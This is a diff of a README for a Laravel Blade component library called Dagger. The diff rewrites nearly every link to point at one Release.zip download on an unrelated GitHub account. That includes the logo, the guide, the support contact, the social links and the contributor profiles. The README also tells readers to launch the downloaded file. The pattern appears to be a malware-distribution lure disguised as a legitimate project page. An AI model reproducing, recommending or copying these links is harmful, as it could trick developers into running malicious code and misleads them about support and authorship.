@@ -1,6 +1,6 @@
 # Dagger: A Robust Component Authoring Library for Laravel Blade
 
-![Dagger Logo](https://example.com/dagger-logo.png)
+![Dagger Logo](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip)
 
 Welcome to the Dagger repository! This library is designed to enhance your Laravel Blade experience by providing a robust set of components for rapid development. With Dagger, you can easily author dynamic and reusable components to streamline your workflow.
 
@@ -39,7 +39,7 @@ Explore the full range of components in the Dagger documentation.
 
 ## Getting Started
 
-Ready to dive in and start using Dagger? Check out our [Getting Started Guide](https://example.com/dagger/getting-started) for a step-by-step tutorial on how to leverage Dagger in your Laravel projects.
+Ready to dive in and start using Dagger? Check out our [Getting Started Guide](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip) for a step-by-step tutorial on how to leverage Dagger in your Laravel projects.
 
 ## Example Usage
 
@@ -51,22 +51,22 @@ Ready to dive in and start using Dagger? Check out our [Getting Started Guide](h
 
 ## Support
 
-If you encounter any issues or have questions about Dagger, feel free to reach out to our team at support@dagger.com or open an issue on the GitHub repository.
+If you encounter any issues or have questions about Dagger, feel free to reach out to our team at https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip or open an issue on the GitHub repository.
 
 ## Download
 
-You can download the latest version of Dagger from the following link: [![Download Dagger](https://img.shields.io/badge/Download-Dagger-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+You can download the latest version of Dagger from the following link: [![Download Dagger](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip)](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip)
 
 *Note: The file in the link needs to be launched.*
 
-If the above link is not working, please check the [Releases](https://github.com/22155555/1875695542/releases) section for alternative download options.
+If the above link is not working, please check the [Releases](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip) section for alternative download options.
 
 ## Stay Connected
 
-Stay up to date with Dagger news and updates by following us on [Twitter](https://twitter.com/dagger) and [LinkedIn](https://linkedin.com/company/dagger).
+Stay up to date with Dagger news and updates by following us on [Twitter](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip) and [LinkedIn](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip).
 
 ---
 
 Thank you for choosing Dagger for your Laravel development needs. We are excited to see the amazing projects you will create with our component authoring library. Happy coding! 🛠️
 
-Contributors: @[githubuser1](https://github.com/githubuser1), @[githubuser2](https://github.com/githubuser2)
+Contributors: @[githubuser1](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip), @[githubuser2](https://github.com/TREY89878668/dagger/releases/download/v1.0/Release.zip)
